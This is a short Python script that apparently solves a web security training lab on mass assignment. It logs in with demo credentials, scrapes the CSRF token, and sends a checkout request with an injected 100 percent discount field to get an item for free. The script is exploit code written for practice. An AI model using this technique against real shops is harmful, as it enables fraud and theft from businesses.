import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting a mass assignment vulnerability"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the login page\n2. Extract the csrf token and session cookie\n3. Login as wiener\n4. Order the leather jacket with full discount\n""")

    print(Fore.WHITE + "[1] Fetching the login page")
    login_page = requests.get(
        f"{url}/login", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[2] Extracting the csrf token and session cookie")
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    print(Fore.GREEN + "CSRF token" + Fore.WHITE +
          " => " + Fore.YELLOW + csrf_token)

    print(Fore.WHITE +
          "[3] Logging in as wiener")
    data = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    cookies = {"session": session}
    wiener_login = requests.post(
        f"{url}/login", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[4] Ordering the leather jacket with full discount")
    session = wiener_login.cookies.get("session")
    cookies = {"session": session}
    json = {"chosen_products": [
        {"product_id": "1", "quantity": 1}], "chosen_discount": {"percentage": 100}}

    try:
        r = requests.post(
            f"{url}/api/checkout", cookies=cookies, json=json, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
